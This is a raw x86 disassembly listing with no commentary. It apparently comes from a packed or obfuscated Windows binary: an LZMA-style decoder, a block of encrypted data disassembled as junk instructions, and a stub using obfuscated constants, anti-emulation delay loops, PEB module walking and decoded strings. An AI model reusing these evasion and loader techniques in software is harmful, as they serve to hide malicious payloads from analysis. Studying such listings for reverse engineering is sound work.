  4256cc:	shr    ecx,1
  4256ce:	rep stos DWORD PTR es:[edi],eax
  4256d0:	push   0x5
  4256d2:	pop    ecx
  4256d3:	call   0x4259be
  4256d8:	loop   0x4256d3
  4256da:	lea    esi,[esi]
  4256dc:	lea    edi,[edi]
  4256de:	mov    edi,DWORD PTR [ebp-0x4]
  4256e1:	mov    eax,DWORD PTR [ebp-0x10]
  4256e4:	sub    edi,DWORD PTR [ebp+0x24]
  4256e7:	and    eax,edi
  4256e9:	mov    DWORD PTR [ebp-0x18],eax
  4256ec:	mov    al,0x0
  4256ee:	call   0x4259d6
  4256f3:	jne    0x42578e
  4256f9:	mov    cl,BYTE PTR [ebp-0xc]
  4256fc:	and    edi,DWORD PTR [ebp-0x14]
  4256ff:	shl    edi,cl
  425701:	sub    cl,0x8
  425704:	neg    cl
  425706:	shr    esi,cl
  425708:	pop    eax
  425709:	add    edi,esi
  42570b:	pop    esi
  42570c:	lea    edi,[edi+edi*2]
  42570f:	shl    edi,0x8
  425712:	cmp    al,0x7
  425714:	pop    edx
  425715:	lea    ecx,[esi+edi*2+0xe6c]
  42571c:	push   ecx
  42571d:	push   esi
  42571e:	mov    esi,0x100
  425723:	push   eax
  425724:	mov    al,0x1
  425726:	jb     0x42575c
  425728:	mov    edi,DWORD PTR [ebp-0x4]
  42572b:	sub    edi,DWORD PTR [ebp-0x24]
  42572e:	movzx  edi,BYTE PTR [edi]
  425731:	mov    ebp,DWORD PTR [ebp-0x34]
  425734:	shl    edi,1
  425736:	mov    ecx,esi
  425738:	and    esi,edi
  42573a:	add    ecx,esi
  42573c:	lea    ebp,[ebp+ecx*2+0x0]
  425740:	call   0x4259f5
  425745:	mov    ecx,eax
  425747:	shr    esi,0x8
  42574a:	and    ecx,0x1
  42574d:	cmp    esi,ecx
  42574f:	mov    esi,0x100
  425754:	jne    0x425764
  425756:	cmp    eax,esi
  425758:	jb     0x425731
  42575a:	jmp    0x425770
  42575c:	mov    ebp,DWORD PTR [ebp-0x34]
  42575f:	call   0x4259f5
  425764:	inc    eax
  425765:	inc    esi
  425766:	sub    eax,0x1
  425769:	sub    esi,0x1
  42576c:	cmp    eax,esi
  42576e:	jb     0x42575c
  425770:	pop    edx
  425771:	inc    edx
  425772:	cmp    edx,0x5
  425775:	dec    edx
  425776:	mov    ecx,edx
  425778:	jb     0x425789
  42577a:	inc    edx
  42577b:	cmp    edx,0xb
  42577e:	dec    edx
  42577f:	mov    cl,0x4
  425781:	dec    cl
  425783:	jb     0x425789
  425785:	mov    cl,0x7
  425787:	dec    cl
  425789:	sub    edx,ecx
  42578b:	push   edx
  42578c:	jmp    0x4257dd
  42578e:	mov    al,0xc1
  425790:	dec    al
  425792:	call   0x4259e6
  425797:	jne    0x4257ad
  425799:	pop    eax
  42579a:	pop    edi
  42579b:	pop    edx
  42579c:	pop    ecx
  42579d:	pop    edx
  42579e:	pop    ecx
  42579f:	push   DWORD PTR [esp]
  4257a2:	push   ecx
  4257a3:	push   edx
  4257a4:	mov    edx,0x664
  4257a9:	mov    cl,0x0
  4257ab:	jmp    0x425820
  4257ad:	mov    al,0xcd
  4257af:	dec    al
  4257b1:	call   0x4259e6
  4257b6:	jne    0x4257e6
  4257b8:	mov    al,0xf1
  4257ba:	dec    al
  4257bc:	call   0x4259d6
  4257c1:	jne    0x425816
  4257c3:	pop    eax
  4257c4:	cmp    al,0x7
  4257c6:	mov    al,0x9
  4257c8:	jb     0x4257cc
  4257ca:	mov    al,0xb
  4257cc:	push   eax
  4257cd:	mov    esi,DWORD PTR [ebp-0x4]
  4257d0:	sub    esi,DWORD PTR [ebp-0x24]
  4257d3:	cmp    esi,DWORD PTR [ebp+0x24]
  4257d6:	jb     0x4259ad
  4257dc:	lods   al,BYTE PTR ds:[esi]
  4257dd:	mov    edi,DWORD PTR [ebp-0x4]
  4257e0:	stos   BYTE PTR es:[edi],al
  4257e1:	jmp    0x425974
  4257e6:	mov    al,0xd8
  4257e8:	call   0x4259e6
  4257ed:	mov    esi,DWORD PTR [ebp-0x28]
  4257f0:	je     0x42580d
  4257f2:	mov    al,0xe4
  4257f4:	call   0x4259e6
  4257f9:	mov    esi,DWORD PTR [ebp-0x2c]
  4257fc:	je     0x425807
  4257fe:	mov    esi,DWORD PTR [ebp-0x30]
  425801:	mov    ecx,DWORD PTR [ebp-0x2c]
  425804:	mov    DWORD PTR [ebp-0x30],ecx
  425807:	mov    ecx,DWORD PTR [ebp-0x28]
  42580a:	mov    DWORD PTR [ebp-0x2c],ecx
  42580d:	mov    ecx,DWORD PTR [ebp-0x24]
  425810:	mov    DWORD PTR [ebp-0x28],ecx
  425813:	mov    DWORD PTR [ebp-0x24],esi
  425816:	pop    eax
  425817:	pop    edi
  425818:	pop    ecx
  425819:	mov    edx,0xa68
  42581e:	mov    cl,0x8
  425820:	add    edx,edi
  425822:	push   edx
  425823:	push   edi
  425824:	cmp    al,0x7
  425826:	mov    al,cl
  425828:	jb     0x42582c
  42582a:	add    al,0x3
  42582c:	push   eax
  42582d:	mov    ebp,DWORD PTR [ebp-0x34]
  425830:	call   0x4259f3
  425835:	jne    0x42584b
  425837:	mov    eax,DWORD PTR [ebp-0x18]
  42583a:	mov    edi,DWORD PTR [ebp-0x34]
  42583d:	shl    eax,0x3
  425840:	sub    ecx,ecx
  425842:	push   0x8
  425844:	pop    esi
  425845:	lea    edi,[edi+eax*2+0x4]
  425849:	jmp    0x425880
  42584b:	mov    ebp,DWORD PTR [ebp-0x34]
  42584e:	add    ebp,0x2
  425851:	call   0x4259f3
  425856:	jne    0x425870
  425858:	mov    eax,DWORD PTR [ebp-0x18]
  42585b:	mov    edi,DWORD PTR [ebp-0x34]
  42585e:	shl    eax,0x3
  425861:	push   0x8
  425863:	pop    ecx
  425864:	push   0x8
  425866:	pop    esi
  425867:	lea    edi,[edi+eax*2+0x104]
  42586e:	jmp    0x425880
  425870:	mov    edi,0x204
  425875:	add    edi,DWORD PTR [ebp-0x34]
  425878:	push   0x10
  42587a:	pop    ecx
  42587b:	mov    esi,0x100
  425880:	mov    DWORD PTR [ebp-0x1c],ecx
  425883:	sub    eax,eax
  425885:	inc    eax
  425886:	mov    ebp,edi
  425888:	call   0x4259f5
  42588d:	mov    ecx,eax
  42588f:	sub    ecx,esi
  425891:	jb     0x425886
  425893:	add    DWORD PTR [ebp-0x1c],ecx
  425896:	cmp    DWORD PTR [ebp-0x3c],0x4
  42589a:	jae    0x425950
  4258a0:	add    DWORD PTR [ebp-0x3c],0x7
  4258a4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4258a7:	cmp    ecx,0x4
  4258aa:	jb     0x4258af
  4258ac:	push   0x3
  4258ae:	pop    ecx
  4258af:	mov    edi,DWORD PTR [ebp-0x38]
  4258b2:	shl    ecx,0x6
  4258b5:	sub    eax,eax
  4258b7:	inc    eax
  4258b8:	push   0x40
  4258ba:	pop    esi
  4258bb:	lea    edi,[edi+ecx*2+0x360]
  4258c2:	mov    ebp,edi
  4258c4:	call   0x4259f5
  4258c9:	mov    ecx,eax
  4258cb:	sub    ecx,esi
  4258cd:	jb     0x4258c2
  4258cf:	mov    DWORD PTR [ebp-0x18],ecx
  4258d2:	mov    DWORD PTR [ebp-0x24],ecx
  4258d5:	cmp    ecx,0x4
  4258d8:	jb     0x42594d
  4258da:	mov    esi,ecx
  4258dc:	and    DWORD PTR [ebp-0x24],0x1
  4258e0:	shr    esi,1
  4258e2:	or     DWORD PTR [ebp-0x24],0x2
  4258e6:	dec    esi
  4258e7:	cmp    ecx,0xe
  4258ea:	jae    0x425905
  4258ec:	mov    eax,0x2af
  4258f1:	sub    eax,ecx
  4258f3:	mov    ecx,esi
  4258f5:	shl    BYTE PTR [ebp-0x24],cl
  4258f8:	add    eax,DWORD PTR [ebp-0x24]
  4258fb:	shl    eax,1
  4258fd:	add    eax,DWORD PTR [ebp-0x38]
  425900:	mov    DWORD PTR [ebp-0x34],eax
  425903:	jmp    0x425932
  425905:	sub    esi,0x4
  425908:	call   0x4259b2
  42590d:	shr    ebx,1
  42590f:	shl    DWORD PTR [ebp-0x24],1
  425912:	cmp    DWORD PTR [ebp-0x20],ebx
  425915:	jb     0x42591d
  425917:	inc    DWORD PTR [ebp-0x24]
  42591a:	sub    DWORD PTR [ebp-0x20],ebx
  42591d:	dec    esi
  42591e:	jne    0x425908
  425920:	mov    eax,0x644
  425925:	add    eax,DWORD PTR [ebp-0x38]
  425928:	mov    DWORD PTR [ebp-0x34],eax
  42592b:	shl    DWORD PTR [ebp-0x24],0x4
  42592f:	push   0x4
  425931:	pop    esi
  425932:	sub    edi,edi
  425934:	inc    edi
  425935:	mov    eax,edi
  425937:	mov    ebp,DWORD PTR [ebp-0x34]
  42593a:	call   0x4259f5
  42593f:	test   al,0x1
  425941:	je     0x425946
  425943:	or     DWORD PTR [ebp-0x24],edi
  425946:	shl    edi,1
  425948:	dec    esi
  425949:	jne    0x425937
  42594b:	jmp    0x42594d
  42594d:	inc    DWORD PTR [ebp-0x24]
  425950:	mov    ecx,DWORD PTR [ebp-0x1c]
  425953:	add    ecx,0x2
  425956:	mov    edi,DWORD PTR [ebp-0x4]
  425959:	mov    eax,edi
  42595b:	sub    eax,DWORD PTR [ebp+0x24]
  42595e:	cmp    DWORD PTR [ebp-0x24],eax
  425961:	ja     0x4259ad
  425963:	mov    esi,edi
  425965:	sub    esi,DWORD PTR [ebp-0x24]
  425968:	mov    edx,DWORD PTR [ebp+0x28]
  42596b:	lods   al,BYTE PTR ds:[esi]
  42596c:	stos   BYTE PTR es:[edi],al
  42596d:	cmp    edi,edx
  42596f:	jae    0x425974
  425971:	dec    ecx
  425972:	jne    0x42596b
  425974:	mov    DWORD PTR [ebp-0x4],edi
  425977:	movzx  esi,al
  42597a:	cmp    edi,DWORD PTR [ebp+0x28]
  42597d:	jb     0x4256de
  425983:	call   0x4259b2
  425988:	sub    eax,eax
  42598a:	lea    ebp,[esp+0x3c]
  42598e:	mov    edx,DWORD PTR [ebp+0x20]
  425991:	mov    esi,DWORD PTR [ebp-0x8]
  425994:	sub    esi,DWORD PTR [ebp+0x18]
  425997:	mov    DWORD PTR [edx],esi
  425999:	mov    edx,DWORD PTR [ebp+0x2c]
  42599c:	mov    edi,DWORD PTR [ebp-0x4]
  42599f:	sub    edi,DWORD PTR [ebx+0x16]
  4259a2:	lods   al,BYTE PTR ds:[esi]
  4259a3:	outs   dx,BYTE PTR ds:[esi]
  4259a4:	lods   eax,DWORD PTR ds:[esi]
  4259a5:	repz inc DWORD PTR [ebx]
  4259a8:	xchg   ecx,eax
  4259a9:	test   BYTE PTR [esi-0x76cd1801],0x87
  4259b0:	xor    eax,0x86758ce9
  4259b5:	xchg   BYTE PTR [esi-0x6a75b076],al
  4259bb:	lea    edx,ds:0x5bb4dfa6
  4259c1:	imul   esi,DWORD PTR [edx+0x5b],0xb41953f6
  4259c8:	fwait
  4259c9:	or     DWORD PTR [ebp-0x53c759f7],ecx
  4259cf:	fwait
  4259d0:	or     DWORD PTR [ebx+ebx*2-0x4b6a0097],ebp
  4259d7:	mov    ebx,0x8960c299
  4259dc:	lea    ecx,ds:0x299b9296
  4259e2:	xchg   edx,eax
  4259e3:	lea    esi,ds:0x8960c29e
  4259e9:	xchg   edx,eax
  4259ea:	fwait
  4259eb:	cdq    
  4259ec:	mov    ah,0x3b
  4259ee:	test   eax,0x869b37bc
  4259f3:	xor    cl,BYTE PTR [ecx-0x7964c844]
  4259f9:	mov    WORD PTR [ebp-0x7a],?
  4259fc:	xchg   BYTE PTR [esi-0x4b09ac76],al
  425a02:	mov    bh,0x16
  425a04:	lea    dx,[edi]
  425a07:	push   ss
  425a08:	push   es
  425a09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a0a:	jb     0x4259c3
  425a0c:	push   ss
  425a0d:	not    DWORD PTR [ebx-0x8]
  425a10:	mov    al,0xca
  425a12:	test   DWORD PTR [edi+0x158d6616],edx
  425a18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a19:	test   al,0xd7
  425a1b:	push   ss
  425a1c:	push   es
  425a1d:	mov    ah,0xb5
  425a1f:	ret    0x55b7
  425a22:	add    cl,al
  425a24:	jmp    0xcaf16934
  425a29:	cmp    DWORD PTR [esp+0x20],ecx
  425a2d:	jae    0x425a46
  425a2f:	mov    ebx,ecx
  425a31:	mov    ecx,0x800
  425a36:	sub    ecx,edx
  425a38:	shr    ecx,0x5
  425a3b:	add    WORD PTR [ebp+0x0],cx
  425a3f:	add    eax,eax
  425a41:	lea    ebp,[esp+0x40]
  425a45:	ret    
  425a46:	shr    edx,0x5
  425a49:	sub    DWORD PTR [esp+0x20],ecx
  425a4d:	sub    ebx,ecx
  425a4f:	sub    WORD PTR [ebp+0x0],dx
  425a53:	add    eax,eax
  425a55:	add    eax,0x1
  425a58:	lea    ebp,[esp+0x40]
  425a5c:	ret    
  425a5d:	push   ebp
  425a5e:	mov    ebp,esp
  425a60:	sub    esp,0x12c
  425a66:	push   ebx
  425a67:	push   esi
  425a68:	push   edi
  425a69:	mov    DWORD PTR [ebp-0x10],0xf89c85a5
  425a70:	mov    DWORD PTR [ebp-0x18],0xf89c85ba
  425a77:	mov    eax,DWORD PTR [ebp+0x8]
  425a7a:	mov    DWORD PTR [ebp+0x8],eax
  425a7d:	mov    ecx,DWORD PTR [ebp-0x10]
  425a80:	mov    ebx,0x75108aa
  425a85:	xor    ecx,ebx
  425a87:	mov    eax,0x3272f1
  425a8c:	add    ecx,eax
  425a8e:	mov    DWORD PTR [ebp-0x24],ecx
  425a91:	mov    ecx,DWORD PTR [ebp-0x10]
  425a94:	xor    ecx,ebx
  425a96:	add    ecx,eax
  425a98:	mov    DWORD PTR [ebp-0x40],ecx
  425a9b:	mov    ecx,DWORD PTR [ebp-0x10]
  425a9e:	xor    ecx,ebx
  425aa0:	add    ecx,eax
  425aa2:	mov    DWORD PTR [ebp-0x3c],ecx
  425aa5:	mov    ecx,DWORD PTR [ebp-0x10]
  425aa8:	xor    ecx,ebx
  425aaa:	add    ecx,eax
  425aac:	mov    DWORD PTR [ebp-0xd8],ecx
  425ab2:	mov    DWORD PTR [ebp-0x50],0xf89f05a5
  425ab9:	mov    DWORD PTR [ebp-0x3c],0xf89cb5a5
  425ac0:	mov    DWORD PTR [ebp-0x54],0xf89c85b9
  425ac7:	push   0x25
  425ac9:	pop    ecx
  425aca:	mov    DWORD PTR [ebp-0x30],ecx
  425acd:	mov    DWORD PTR [ebp-0x30],ecx
  425ad0:	push   0x65
  425ad2:	pop    ecx
  425ad3:	mov    DWORD PTR [ebp-0x30],ecx
  425ad6:	mov    DWORD PTR [ebp-0x30],ecx
  425ad9:	mov    DWORD PTR [ebp-0x30],0x4d
  425ae0:	mov    DWORD PTR [ebp-0x30],0x43
  425ae7:	mov    ecx,DWORD PTR [ebp-0x10]
  425aea:	xor    ecx,ebx
  425aec:	add    ecx,eax
  425aee:	mov    DWORD PTR [ebp-0x30],ecx
  425af1:	mov    ecx,DWORD PTR [ebp-0x10]
  425af4:	xor    ecx,ebx
  425af6:	add    ecx,eax
  425af8:	mov    DWORD PTR [ebp-0x30],ecx
  425afb:	mov    DWORD PTR [ebp-0x28],0x258
  425b02:	mov    DWORD PTR [ebp-0x34],0x36
  425b09:	mov    DWORD PTR [ebp-0x14],0x7a
  425b10:	lea    edi,[ebp-0x10c]
  425b16:	lea    esi,[ebp-0x12c]
  425b1c:	call   0x4267db
  425b21:	dec    DWORD PTR [ebp-0x14]
  425b24:	jne    0x425b10
  425b26:	dec    DWORD PTR [ebp-0x34]
  425b29:	jne    0x425b09
  425b2b:	dec    DWORD PTR [ebp-0x28]
  425b2e:	jne    0x425b02
  425b30:	mov    DWORD PTR [ebp-0x28],0x400e
  425b37:	mov    eax,DWORD PTR [ebp-0x10]
  425b3a:	xor    eax,ebx
  425b3c:	mov    esi,0x3272f1
  425b41:	add    eax,esi
  425b43:	mov    DWORD PTR [ebp-0x1c],eax
  425b46:	mov    eax,DWORD PTR [ebp-0x10]
  425b49:	and    DWORD PTR [ebp-0x94],0x0
  425b50:	xor    eax,ebx
  425b52:	add    eax,esi
  425b54:	mov    DWORD PTR [ebp-0x38],eax
  425b57:	mov    eax,fs:0x18
  425b5d:	mov    DWORD PTR [ebp-0x94],eax
  425b63:	mov    eax,DWORD PTR [eax+0x30]
  425b66:	mov    DWORD PTR [ebp-0xcc],eax
  425b6c:	mov    eax,DWORD PTR [eax+0xc]
  425b6f:	mov    DWORD PTR [ebp-0xc0],eax
  425b75:	mov    eax,DWORD PTR [ebp+0x8]
  425b78:	lea    ecx,[ebp-0x94]
  425b7e:	mov    DWORD PTR [eax+0x1a0],ecx
  425b84:	mov    eax,DWORD PTR [ebp+0x8]
  425b87:	lea    ecx,[ebp-0xcc]
  425b8d:	mov    DWORD PTR [eax+0x1a4],ecx
  425b93:	mov    eax,DWORD PTR [ebp+0x8]
  425b96:	push   DWORD PTR [ebp+0x8]
  425b99:	lea    ecx,[ebp-0xc0]
  425b9f:	mov    DWORD PTR [eax+0x1a8],ecx
  425ba5:	call   0x427f9c
  425baa:	mov    ecx,DWORD PTR [ebp-0x10]
  425bad:	xor    ecx,ebx
  425baf:	add    ecx,esi
  425bb1:	cmp    ecx,eax
  425bb3:	je     0x425f36
  425bb9:	mov    eax,DWORD PTR [ebp+0x8]
  425bbc:	mov    eax,DWORD PTR [eax+0x194]
  425bc2:	mov    ecx,DWORD PTR [eax]
  425bc4:	mov    eax,DWORD PTR [ebp+0x8]
  425bc7:	mov    eax,DWORD PTR [eax+0x194]
  425bcd:	mov    eax,DWORD PTR [eax]
  425bcf:	add    eax,DWORD PTR [ecx+0x3c]
  425bd2:	mov    ecx,DWORD PTR [ebp+0x8]
  425bd5:	mov    ecx,DWORD PTR [ecx+0x1e0]
  425bdb:	lea    edx,[ebp-0xec]
  425be1:	push   edx
  425be2:	mov    edx,DWORD PTR [ebp+0x8]
  425be5:	mov    edx,DWORD PTR [edx+0x18c]
  425beb:	mov    edx,DWORD PTR [edx]
  425bed:	add    edx,DWORD PTR [eax+0x88]
  425bf3:	push   0x4
  425bf5:	push   DWORD PTR [eax+0x8c]
  425bfb:	push   edx
  425bfc:	call   DWORD PTR [ecx+0x1c]
  425bff:	push   DWORD PTR [ebp+0x8]
  425c02:	xor    eax,eax
  425c04:	mov    DWORD PTR [ebp-0xa8],0x1b3e0e34
  425c0e:	mov    DWORD PTR [ebp-0xa4],0x12370d1c
  425c18:	mov    DWORD PTR [ebp-0xa0],0x3c0d180a
  425c22:	mov    BYTE PTR [ebp-0x9c],0x83
  425c29:	lea    edi,[ebp-0x9b]
  425c2f:	stos   DWORD PTR es:[edi],eax
  425c30:	stos   WORD PTR es:[edi],ax
  425c32:	stos   BYTE PTR es:[edi],al
  425c33:	xor    eax,eax
  425c35:	mov    DWORD PTR [ebp-0xbc],0x1b3e0e34
  425c3f:	mov    DWORD PTR [ebp-0xb8],0x12370d1c
  425c49:	mov    DWORD PTR [ebp-0xb4],0x2a0d180a
  425c53:	mov    BYTE PTR [ebp-0xb0],0x83
  425c5a:	lea    edi,[ebp-0xaf]
  425c60:	stos   DWORD PTR es:[edi],eax
  425c61:	stos   WORD PTR es:[edi],ax
  425c63:	stos   BYTE PTR es:[edi],al
  425c64:	mov    edi,DWORD PTR [ebp+0x8]
  425c67:	mov    eax,DWORD PTR [ebp+0x8]
  425c6a:	mov    edx,DWORD PTR [eax+0x1b8]
  425c70:	mov    DWORD PTR [ebp-0x68],0xd0f0e17
  425c77:	mov    DWORD PTR [ebp-0x64],0x1413101e
  425c7e:	mov    WORD PTR [ebp-0x60],0x833c
  425c84:	mov    DWORD PTR [ebp-0x90],0x1b3e0e34
  425c8e:	mov    DWORD PTR [ebp-0x8c],0x173c0d1c
  425c98:	mov    DWORD PTR [ebp-0x88],0x311c1b13
  425ca2:	mov    DWORD PTR [ebp-0x84],0xd181008
  425cac:	mov    DWORD PTR [ebp-0x80],0x833c1e14
  425cb3:	mov    DWORD PTR [ebp-0x7c],0x1b3e0e34
  425cba:	mov    DWORD PTR [ebp-0x78],0x173c0d1c
  425cc1:	mov    DWORD PTR [ebp-0x74],0x311c1b13
  425cc8:	mov    DWORD PTR [ebp-0x70],0xd181008
  425ccf:	mov    DWORD PTR [ebp-0x6c],0x832a1e14
  425cd6:	call   0x427fcb
  425cdb:	push   eax
  425cdc:	mov    eax,DWORD PTR [ebp+0x8]
  425cdf:	mov    eax,DWORD PTR [eax+0x1a8]
  425ce5:	push   DWORD PTR [eax]
  425ce7:	call   0x427c6c
  425cec:	test   eax,eax
  425cee:	jne    0x425d40
  425cf0:	mov    eax,DWORD PTR [ebp+0x8]
  425cf3:	mov    eax,DWORD PTR [eax+0x1e0]
  425cf9:	mov    edi,DWORD PTR [ebp+0x8]
  425cfc:	add    eax,0x4
  425cff:	mov    DWORD PTR [ebp-0x20],eax
  425d02:	mov    eax,DWORD PTR [ebp+0x8]
  425d05:	mov    edx,DWORD PTR [eax+0x1b8]
  425d0b:	call   0x427fcb
  425d10:	push   eax
  425d11:	mov    eax,DWORD PTR [ebp-0x20]
  425d14:	call   DWORD PTR [eax]
  425d16:	test   eax,eax
  425d18:	jne    0x425d40
  425d1a:	mov    eax,DWORD PTR [ebp+0x8]
  425d1d:	mov    eax,DWORD PTR [eax+0x1e0]
  425d23:	mov    edi,DWORD PTR [ebp+0x8]
  425d26:	add    eax,0x10
  425d29:	mov    DWORD PTR [ebp-0x20],eax
  425d2c:	mov    eax,DWORD PTR [ebp+0x8]
  425d2f:	mov    edx,DWORD PTR [eax+0x1b8]
  425d35:	call   0x427fcb
  425d3a:	push   eax
  425d3b:	mov    eax,DWORD PTR [ebp-0x20]
  425d3e:	call   DWORD PTR [eax]
  425d40:	mov    eax,DWORD PTR [ebp-0x10]
  425d43:	mov    ecx,DWORD PTR [ebp-0x28]
  425d46:	xor    eax,ebx
  425d48:	add    eax,esi
  425d4a:	cmp    eax,ecx
  425d4c:	je     0x425f0f
  425d52:	mov    eax,DWORD PTR [ebp-0x18]
  425d55:	xor    eax,ebx
  425d57:	mov    ecx,0xffcd8d0f
  425d5c:	sub    ecx,eax
  425d5e:	add    ecx,DWORD PTR [ebp-0x28]
  425d61:	mov    eax,DWORD PTR [ebp-0x1c]
  425d64:	cmp    eax,ecx
  425d66:	ja     0x425f0f
  425d6c:	mov    DWORD PTR [ebp-0x34],0x0
  425d73:	push   DWORD PTR [ebp+0x8]
  425d76:	mov    edi,DWORD PTR [ebp+0x8]
  425d79:	mov    eax,DWORD PTR [ebp+0x8]
  425d7c:	mov    edx,DWORD PTR [eax+0x1b4]
  425d82:	call   0x427fcb
  425d87:	push   eax
  425d88:	mov    eax,DWORD PTR [ebp+0x8]
  425d8b:	mov    eax,DWORD PTR [eax+0x1a8]
  425d91:	push   DWORD PTR [eax]
  425d93:	call   0x427c6c
  425d98:	mov    ecx,DWORD PTR [ebp+0x8]
  425d9b:	mov    ecx,DWORD PTR [ecx+0x19c]
  425da1:	mov    DWORD PTR [ecx],eax
  425da3:	mov    eax,DWORD PTR [ebp+0x8]
  425da6:	mov    edi,DWORD PTR [eax+0x1e0]
  425dac:	mov    esi,DWORD PTR [ebp+0x8]
  425daf:	xor    eax,eax
  425db1:	lea    edx,[ebp-0x7c]
  425db4:	call   0x428001
  425db9:	push   eax
  425dba:	mov    eax,DWORD PTR [ebp+0x8]
  425dbd:	mov    eax,DWORD PTR [eax+0x19c]
  425dc3:	push   DWORD PTR [eax]
  425dc5:	call   DWORD PTR [edi+0x8]
  425dc8:	mov    DWORD PTR [ebp-0x20],eax
  425dcb:	mov    eax,DWORD PTR [ebp+0x8]
  425dce:	mov    edi,DWORD PTR [eax+0x1e0]
  425dd4:	mov    esi,DWORD PTR [ebp+0x8]
  425dd7:	xor    eax,eax
  425dd9:	lea    edx,[ebp-0x90]
  425ddf:	call   0x428001
  425de4:	push   eax
  425de5:	mov    eax,DWORD PTR [ebp+0x8]
  425de8:	mov    eax,DWORD PTR [eax+0x19c]
  425dee:	push   DWORD PTR [eax]
  425df0:	call   DWORD PTR [edi+0x8]
  425df3:	mov    eax,DWORD PTR [ebp+0x8]
  425df6:	mov    edi,DWORD PTR [eax+0x1e0]
  425dfc:	mov    esi,DWORD PTR [ebp+0x8]
  425dff:	xor    eax,eax
  425e01:	lea    edx,[ebp-0xa8]
  425e07:	call   0x428001
  425e0c:	push   eax
  425e0d:	mov    eax,DWORD PTR [ebp+0x8]
  425e10:	mov    eax,DWORD PTR [eax+0x19c]
  425e16:	push   DWORD PTR [eax]
  425e18:	call   DWORD PTR [edi+0x8]
  425e1b:	and    DWORD PTR [ebp-0x8],0x0
  425e1f:	mov    DWORD PTR [ebp-0x48],eax
  425e22:	mov    eax,DWORD PTR [ebp-0x8]
  425e25:	and    eax,0x7
  425e28:	add    eax,0x31
  425e2b:	push   eax
  425e2c:	call   DWORD PTR [ebp-0x20]
  425e2f:	test   eax,eax
  425e31:	je     0x425e75
  425e33:	mov    eax,DWORD PTR [ebp-0x8]
  425e36:	push   0x19
  425e38:	xor    edx,edx
  425e3a:	pop    ecx
  425e3b:	div    ecx
  425e3d:	add    dl,0x41
  425e40:	movzx  eax,dl
  425e43:	push   eax
  425e44:	call   DWORD PTR [ebp-0x48]
  425e47:	test   eax,eax
  425e49:	jne    0x425e75
  425e4b:	mov    eax,DWORD PTR [ebp+0x8]
  425e4e:	mov    edi,DWORD PTR [eax+0x1e0]
  425e54:	mov    esi,DWORD PTR [ebp+0x8]
  425e57:	xor    eax,eax
  425e59:	lea    edx,[ebp-0x68]
  425e5c:	call   0x428001
  425e61:	push   eax
  425e62:	mov    eax,DWORD PTR [ebp+0x8]
  425e65:	mov    eax,DWORD PTR [eax+0x198]
  425e6b:	push   DWORD PTR [eax]
  425e6d:	call   DWORD PTR [edi+0x8]
  425e70:	mov    DWORD PTR [ebp-0x14],eax
  425e73:	jmp    0x425e79
  425e75:	and    DWORD PTR [ebp-0x14],0x0
  425e79:	inc    DWORD PTR [ebp-0x8]
  425e7c:	cmp    DWORD PTR [ebp-0x8],0x10
  425e80:	jb     0x425e22
  425e82:	mov    eax,DWORD PTR [ebp-0x18]
  425e85:	mov    esi,DWORD PTR [ebp+0x8]
  425e88:	xor    eax,ebx
  425e8a:	mov    edi,0x3272f1
  425e8f:	add    eax,edi
  425e91:	lea    edx,[ebp-0x10c]
  425e97:	call   0x428001
  425e9c:	push   eax
  425e9d:	mov    eax,DWORD PTR [ebp-0x10]
  425ea0:	mov    esi,DWORD PTR [ebp+0x8]
  425ea3:	xor    eax,ebx
  425ea5:	add    eax,edi
  425ea7:	lea    edx,[ebp-0x12c]
  425ead:	call   0x428001
  425eb2:	push   eax
  425eb3:	call   DWORD PTR [ebp-0x14]
  425eb6:	mov    ecx,DWORD PTR [ebp-0x10]
  425eb9:	xor    ecx,ebx
  425ebb:	add    ecx,edi
  425ebd:	cmp    ecx,eax
  425ebf:	jne    0x425ec8
  425ec1:	mov    DWORD PTR [ebp-0x34],0x1
  425ec8:	mov    eax,DWORD PTR [ebp-0x18]
  425ecb:	mov    ecx,DWORD PTR [ebp-0x1c]
  425ece:	xor    eax,ebx
  425ed0:	lea    eax,[eax+ecx*1+0x3272f1]
  425ed7:	mov    DWORD PTR [ebp-0x1c],eax
  425eda:	mov    eax,DWORD PTR [ebp-0x34]
  425edd:	test   eax,eax
  425edf:	je     0x425ef3
  425ee1:	mov    eax,DWORD PTR [ebp-0x18]
  425ee4:	mov    ecx,DWORD PTR [ebp-0x38]
  425ee7:	xor    eax,ebx
  425ee9:	lea    eax,[eax+ecx*1+0x3272f1]
  425ef0:	mov    DWORD PTR [ebp-0x38],eax
  425ef3:	mov    eax,DWORD PTR [ebp-0x18]
  425ef6:	xor    eax,ebx
  425ef8:	mov    ecx,0xffcd8d0f
  425efd:	sub    ecx,eax
  425eff:	add    ecx,DWORD PTR [ebp-0x28]
  425f02:	mov    eax,DWORD PTR [ebp-0x1c]
  425f05:	cmp    eax,ecx
  425f07:	jbe    0x425d6c
  425f0d:	mov    esi,edi
  425f0f:	mov    eax,DWORD PTR [ebp-0x38]
  425f12:	mov    ecx,DWORD PTR [ebp-0x1c]
  425f15:	cmp    ecx,eax
  425f17:	jne    0x425f2a
  425f19:	push   DWORD PTR [ebp+0x8]
  425f1c:	lea    eax,[ebp-0x40]
  425f1f:	push   eax
  425f20:	call   0x428a6e
  425f25:	mov    DWORD PTR [ebp-0x24],eax
  425f28:	jmp    0x425f36
  425f2a:	mov    eax,DWORD PTR [ebp-0x24]
  425f2d:	mov    ecx,DWORD PTR [ebp-0x18]
  425f30:	xor    ecx,ebx
  425f32:	add    ecx,esi
  425f34:	xor    DWORD PTR [eax],ecx
  425f36:	mov    eax,DWORD PTR [ebp-0x10]
  425f39:	mov    ecx,DWORD PTR [ebp-0x24]
  425f3c:	xor    eax,ebx
  425f3e:	add    eax,esi
  425f40:	cmp    eax,ecx
  425f42:	je     0x4266b9
  425f48:	mov    eax,DWORD PTR [ebp-0x10]
  425f4b:	mov    ecx,DWORD PTR [ebp-0x40]
  425f4e:	xor    eax,ebx
  425f50:	add    eax,esi
  425f52:	cmp    eax,ecx
  425f54:	je     0x4266b9
  425f5a:	mov    eax,DWORD PTR [ebp-0x10]
  425f5d:	xor    eax,ebx
  425f5f:	add    eax,esi
  425f61:	jmp    0x425f7f
  425f63:	mov    edi,DWORD PTR [ebp-0x24]
  425f66:	mov    cl,al
  425f68:	and    cl,0x1f
  425f6b:	or     dl,0xff
  425f6e:	sub    dl,cl
  425f70:	add    BYTE PTR [edi+eax*1],dl
  425f73:	mov    ecx,DWORD PTR [ebp-0x18]
